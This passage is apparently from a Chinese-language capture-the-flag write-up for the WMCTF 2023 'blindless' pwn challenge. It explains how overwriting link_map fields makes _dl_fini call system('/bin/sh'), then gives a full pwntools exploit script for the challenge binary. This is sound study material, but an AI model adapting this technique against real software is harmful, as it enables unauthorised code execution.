            <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">code</span><span class="p">[(</span><span class="nb">long</span><span class="p">)</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>通过<code>'@'</code>​指令我们可以增加data的大小，data地址为<code>mmap_base+0x10</code>​</p>
<p>将我们传入的偏移加到data地址上</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100435-0d5bb808-52a3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100440-10570c74-52a3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100445-13ad591e-52a3-1.png"/></p>
<p>再通过<code>.</code>​来向写内容，<code>&gt;</code>​来抬地址以此来循环写入</p>
<h5 data-content="1" id="dbec0696f5a970cc542fb7e2c34e2b08">解题思路：</h5>
<blockquote>
<p>控制<code>rdi(_rtld_global+2312)</code>​为<code>'/bin/sh\x00'</code>​</p>
<p>控制<code>l-&gt;l_addr</code>​ + <code>l-&gt;l_info[DT_FINI]</code>​-&gt;<code>d_un.d_ptr</code>​最终指向<code>system</code>​</p>
<p>控制<code>l-&gt;l_info[DT_FINI_ARRAY] = 0</code>​</p>
<p>显式触发<code>exit</code>​函数调用<code>_dl_fini</code>​函数</p>
</blockquote>
<h5 data-content="1" id="ba696bfbc03b7709062e96fdc1bc9caf">动态调试：</h5>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'@'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">argv0</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span> 
<span class="c1">#argv0 = _rtld_global+2312 - mmap_base</span>
<span class="c1">#argv0即_rtld_global+2312与mmap_base的偏移</span>
<span class="c1">#设置rdi = _rtld_global+2312 = '/bin/sh\x00'</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100518-2757f424-52a3-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'@'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">l_addr</span><span class="o">-</span><span class="n">argv0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">write</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span> 
<span class="c1">#l_addr+0xe0</span>
</pre></div>
<p>​<code>l-&gt;l_info[DT_INIT]</code>​-&gt;<code>d_un.d_ptr</code>​为0x1000，我们通过低位覆盖使<code>l-&gt;l_info[DT_FINI]</code>​指向<code>l-&gt;l_info[DT_INIT]</code>​</p>
<p>而<code>l-&gt;l_addr</code>​=elf_base程序基地址，<code>system_addr</code>​=elf_base+0x10e0</p>
<p>也就是说我们只需要修改<code>l-&gt;l_addr</code>​储存的基地址的最低位为e0</p>
<p>即可控制<code>l-&gt;l_addr</code>​来使得<code>l-&gt;l_addr</code>​ + <code>l-&gt;l_info[DT_FINI]</code>​-&gt;<code>d_un.d_ptr</code>​最终指向<code>system</code>​</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100527-2cb11e96-52a3-1.png"/></p>
<p>当前<code>data地址（mmap_base+argv0）</code>​加上<code>l_addr-argv0-8</code>​的偏移，这里<code>-8</code>​是因为我们写入<code>'/bin/sh\x00'</code>​一共抬高了8字节</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100536-31f8d92a-52a3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100722-70d0a09c-52a3-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'@'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">dt_fini</span><span class="o">-</span><span class="n">l_addr</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">write</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">))</span>
<span class="c1">#上步操作抬高了1字节，所以-1</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100740-7b80c6c0-52a3-1.png"/></p>
<p>​<code>l-&gt;l_info[DT_FINI]</code>​地址为mmap_base+0x33e190+0xa8</p>
<p>​<code>l-&gt;l_info[DT_FINI]</code>​储存着<code>elf_base + 0x3DB8</code>​，<code>l-&gt;l_info[DT_INIT]</code>​储存着<code>elf_base + 0x3DA8</code>​</p>
<p>而我们将<code>l-&gt;l_info[DT_FINI]</code>​储存的<code>elf_base + 0x3DB8</code>​最后一位​<code>B8</code>​改为<code>A8</code>​使得</p>
<p>​<code>l-&gt;l_info[DT_FINI]=l_info[DT_INIT]</code>​就能实现最终指向system</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100748-805d69fa-52a3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100807-8ba3cba6-52a3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100812-8e988cd4-52a3-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'@'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">dt_fini_array</span><span class="o">-</span><span class="n">dt_fini</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">write</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> 
<span class="c1">#l-&gt;l_info[DT_FINI_ARRAY] = 0</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100822-94e5ffe0-52a3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100831-9a0480dc-52a3-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'q'</span>
<span class="c1">#显式触发exit函数调用_dl_fini函数，进而控制程序流</span>
</pre></div>
<p>步入exit查看</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100838-9e7470fa-52a3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100844-a2123b34-52a3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100851-a644b772-52a3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100856-a940ce98-52a3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914100902-ac64064e-52a3-1.png"/></p>
<h5 data-content="1" id="9d653832f9be7311478ab6cc4f4e18e8">exp：</h5>
<div class="highlight"><pre><span></span><span class="c1"># encoding = utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.rop</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.context</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.fmtstr</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.util.packing</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwnlib.gdb</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="c1"># from ae64 import AE64</span>
<span class="c1"># from LibcSearcher import *</span>

<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>

<span class="n">name</span> <span class="o">=</span> <span class="s1">'./pwn'</span>

<span class="n">debug</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'127.0.0.1'</span><span class="p">,</span><span class="mi">8000</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="n">libcso</span> <span class="o">=</span> <span class="s1">'./libc-2.31.so'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libcso</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">,</span><span class="n">num</span>           <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="o">-</span><span class="n">num</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">,</span><span class="n">num</span>           <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">data</span><span class="p">)[</span><span class="o">-</span><span class="n">num</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
<span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\xf7</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">li</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="se">\x1b</span><span class="s1">[01;38;5;214m'</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x1b</span><span class="s1">[0m'</span><span class="p">)</span>
<span class="n">ll</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="se">\x1b</span><span class="s1">[01;38;5;1m'</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\x1b</span><span class="s1">[0m'</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'gnome-terminal'</span><span class="p">,</span><span class="s1">'-x'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'-c'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)):</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'.'</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">content</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">'&gt;'</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
   <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
   <span class="n">pause</span><span class="p">()</span>

<span class="n">ru</span><span class="p">(</span><span class="s1">'size</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x100000</span><span class="p">))</span>
<span class="n">ru</span><span class="p">(</span><span class="s1">'size</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x100</span><span class="p">))</span>
<span class="n">ru</span><span class="p">(</span><span class="s1">'code</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

<span class="n">argv0</span> <span class="o">=</span> <span class="mh">0x33d968</span>
<span class="n">l_addr</span> <span class="o">=</span> <span class="mh">0x33e190</span>
<span class="n">dt_fini</span> <span class="o">=</span> <span class="mh">0x33e190</span><span class="o">+</span><span class="mh">0xa8</span>
<span class="n">dt_fini_array</span> <span class="o">=</span> <span class="mh">0x33e190</span><span class="o">+</span><span class="mh">0x110</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'@'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">argv0</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'@'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">l_addr</span><span class="o">-</span><span class="n">argv0</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">write</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'@'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">dt_fini</span><span class="o">-</span><span class="n">l_addr</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">write</span><span class="p">(</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'@'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">dt_fini_array</span><span class="o">-</span><span class="n">dt_fini</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">write</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'q'</span>
<span class="c1">#dbg()</span>
<span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>


<span class="n">itr</span><span class="p">()</span>
</pre></div>
<p>​​<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230914101015-d7f0af92-52a3-1.png"/><br/>
​​</p>
<p>‍</p>
<h3 data-content="1" id="e0562f8c5d369e3016783a1144d6c04b">参考链接：</h3>
<p><a href="https://zhuanlan.zhihu.com/p/652099671#blindless" target="_blank">WMCTF2023 pwn 部分wp - 知乎 (zhihu.com)</a></p>
<p><a href="https://grxer.gitee.io/2023/08/28/2023wmctf/#blindless" target="_blank">2023 WMCTF (gitee.io)</a></p>
<p><a href="http://blog.xmcve.com/2023/08/22/WMCTF-2023-Writeup/#title-16" target="_blank">WMCTF 2023 Writeup - 星盟安全团队 (xmcve.com)</a></p>
</div>
</div>